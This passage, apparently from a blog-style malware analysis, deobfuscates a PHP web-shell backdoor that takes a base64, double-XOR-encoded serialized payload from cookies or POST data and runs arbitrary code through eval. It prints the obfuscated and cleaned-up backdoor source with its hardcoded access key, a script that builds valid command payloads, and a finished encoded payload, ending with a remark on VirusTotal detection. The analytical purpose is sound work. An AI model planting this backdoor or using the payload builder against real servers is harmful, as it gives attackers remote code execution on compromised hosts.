| }\                                                                    |
| \                                                                     |
| function b6ddf34f(\$e76477, \$qead07){\                               |
|  global \$rb22c05fb;\                                                 |
|  global \$x864b367c;\                                                 |
|  return r6971a(r6971a(\$e76477, \$x864b367c), \$qead07);\             |
| }\                                                                    |
| \                                                                     |
| foreach (\$\_COOKIE as \$qead07=\>\$l0c59b){\                         |
|  \$e76477 = \$l0c59b;\                                                |
|  \$k93f152 = \$qead07;\                                               |
| }\                                                                    |
| \                                                                     |
| if (!\$e76477){\                                                      |
|  foreach (\$\_POST as \$qead07=\>\$l0c59b){\                          |
|  \$e76477 = \$l0c59b;\                                                |
|  \$k93f152 = \$qead07;\                                               |
|  }\                                                                   |
| }\                                                                    |
| \                                                                     |
| \$e76477 = \@unserialize(b6ddf34f(base64\_decode(\$e76477),           |
| \$k93f152));                                                          |
|                                                                       |
| \                                                                     |
| if (isset(\$e76477\[\'ak\'\]) && \$x864b367c==\$e76477\[\'ak\'\]){\   |
|  if (\$e76477\[\'a\'\] == \'i\'){\                                    |
|  \$n28c = Array(\'pv\' =\> \@phpversion(),\'sv\' =\> \'1.0-1\',);\    |
|  echo \@serialize(\$n28c);\                                           |
|  }\                                                                   |
|  elseif (\$e76477\[\'a\'\] == \'e\'){\                                |
|  eval/\*v4c8\*/(\$e76477\[\'d\'\]);\                                  |
|  }\                                                                   |
|  exit();\                                                             |
| }                                                                     |
+-----------------------------------------------------------------------+

Finally lets go ahead and do some rewriting and commenting, to get the
complete view of what is going on.

+-----------------------------------------------------------------------+
| \<?php\                                                               |
| \                                                                     |
| // Prevents all errors and set unlimited execution time\              |
| \@ini\_set(\'error\_log\', NULL);\                                    |
| \@ini\_set(\'log\_errors\', 0);\                                      |
| \@ini\_set(\'max\_execution\_time\', 0);\                             |
| \@set\_time\_limit(0);\                                               |
| \                                                                     |
| // This is just a repeating XOR cipher, repeating cipherKey to length |
| of text\                                                              |
| function repXOR(\$text, \$cipherKey){\                                |
|  \$xorStr = \"\";\                                                    |
|  for (\$x = 0; \$x \< strlen(\$text);){\                              |
| for (\$i = 0; \$i \< strlen(\$cipherKey) && \$x \< strlen(\$text);    |
| \$i++, \$x++){\                                                       |
|  \$xorStr .= chr(ord(\$text\[\$x\]) \^ ord(\$cipherKey\[\$i\]));\     |
|  }\                                                                   |
|  }\                                                                   |
|  return \$xorStr;\                                                    |
| }\                                                                    |
| \                                                                     |
| // Initialize primary variables\                                      |
| \$key = NULL;\                                                        |
| \$value = NULL;\                                                      |
| \                                                                     |
| // Iterate all \$\_COOKIE key =\> value, setting \$value & \$key,     |
| overwriting if multiple\                                              |
| foreach (\$\_COOKIE as \$cKey =\> \$cVal){\                           |
|  \$value = \$cVal;\                                                   |
|  \$key = \$cKey;\                                                     |
| }\                                                                    |
| \                                                                     |
| // If no \$\_COOKIE was present, try all \$\_POST, again overwriting  |
| if multiple\                                                          |
| if (!\$value){\                                                       |
|  foreach (\$\_POST as \$pKey =\> \$pVal){\                            |
|  \$value = \$pVal;\                                                   |
|  \$key = \$pKey;\                                                     |
|  }\                                                                   |
| }\                                                                    |
| \                                                                     |
| /\*\                                                                  |
|  Decode \$payload                                                     |
|                                                                       |
|  1. Base64 decode\                                                    |
|  2. First XOR pass using provided ID\                                 |
|  3. Second XOR pass using provided key name from \$\_COOKIE or        |
| \$\_POST\                                                             |
|  4. Unserialize it\                                                   |
| \*/\                                                                  |
| \$payload = \@base64\_decode(\$value);\                               |
| \$payload = \@repXOR(\$payload,                                       |
| \'d4a8745e-2599-49bc-b7e3-2b194ca49aef\');\                           |
| \$payload = \@repXOR(\$payload, \$key);\                              |
| \$payload = \@unserialize(\$payload);\                                |
| \                                                                     |
| /\*\                                                                  |
|  // Payload requires ID\                                              |
|  \$payload\[\'ak\'\] =\> \'d4a8745e-2599-49bc-b7e3-2b194ca49aef\',\   |
|  // Show info\                                                        |
|  \$payload\[\'a\'\] =\> \'i\',\                                       |
|  // Eval code\                                                        |
|  \$payload\[\'a\'\] =\> \'e\',\                                       |
|  \$payload\[\'d\'\] =\> \'echo \\\"Hi\\\";\'\                         |
| \*/\                                                                  |
| if (isset(\$payload\[\'ak\'\]) &&                                     |
| \'d4a8745e-2599-49bc-b7e3-2b194ca49aef\' == \$payload\[\'ak\'\]){\    |
|  // if \$payload\[\'a\'\] == \'i\' respond with php version and       |
| \"backdoor\" version, serialized\                                     |
|  if (\$payload\[\'a\'\] == \'i\'){\                                   |
|  \$info = Array(\                                                     |
|  \'pv\' =\> \@phpversion(),\                                          |
|  \'sv\' =\> \'1.0-1\',\                                               |
| );\                                                                   |
|  echo \@serialize(\$info);\                                           |
|  // if \$payload\[\'a\'\] == \'e\', then evaluate code in             |
| \$payload\[\'d\'\]\                                                   |
|  } elseif (\$payload\[\'a\'\] == \'e\'){\                             |
|  eval(\$payload\[\'d\'\]);\                                           |
|  }\                                                                   |
|  exit();\                                                             |
| }                                                                     |
+-----------------------------------------------------------------------+

So, to be able to generate a valid payload, something like this would
do:

  ------------------------------------------------------------------------------------
  \<?php\
  function repXOR(\$text, \$cipherKey){\
  \$xorStr = \"\";\
  for (\$x = 0; \$x \< strlen(\$text);){\
  for (\$i = 0; \$i \< strlen(\$cipherKey) && \$x \< strlen(\$text); \$i++, \$x++){\
   \$xorStr .= chr(ord(\$text\[\$x\]) \^ ord(\$cipherKey\[\$i\]));\
   }\
   }\
   return \$xorStr;\
  }\
  \
  \$payload = \[\
   // ID is required\
   \'ak\' =\> \'d4a8745e-2599-49bc-b7e3-2b194ca49aef\',\
   // show info\
  // \'a\' =\> \'i\',\
   // or execute code\
   \'a\' =\> \'e\',\
   \'d\' =\> \"echo \\\"Hi\\\";\"\
  \];\
  // set key name\
  \$payloadKeyName = \"payload\";\
  // set ID\
  \$payloadID = \"d4a8745e-2599-49bc-b7e3-2b194ca49aef\";\
  \
  // 1. Serialize it\
  \$payload = serialize(\$payload);\
  // 2. XOR with key name\
  \$payload = repXOR(\$payload, \$payloadKeyName);\
  // 3. XOR with ID\
  \$payload = repXOR(\$payload, \$payloadID);\
  // 4. base64 encode\
  \$finishedPayload = base64\_encode(\$payload);\

  ------------------------------------------------------------------------------------

Finished payload ready to be sent, executing "echo "Hi";"

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------
  Array\
  (\
   \[payload\] =\> dW8rbiMmayd2aTg9enI3Yig5eCE3ITNsaTllOGkwLWFvLTUvZy4gNWE1dilmPGthaT40dDdtKWBlPzl7bDl3KHchfmFpPzdiP2N9Y2J+dnhjZidneH53d2hhIX12QH0KOlpjY280cw==\
  )\

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------

VirusTotal was not amazing on this one, which can be understandable
based on hash recognition, but I had expected a tad more from the
heuristics.![](Pictures/1000020100000467000001DA209F377384B3DAEF.png){width="6.2709in"
height="2.639in"}
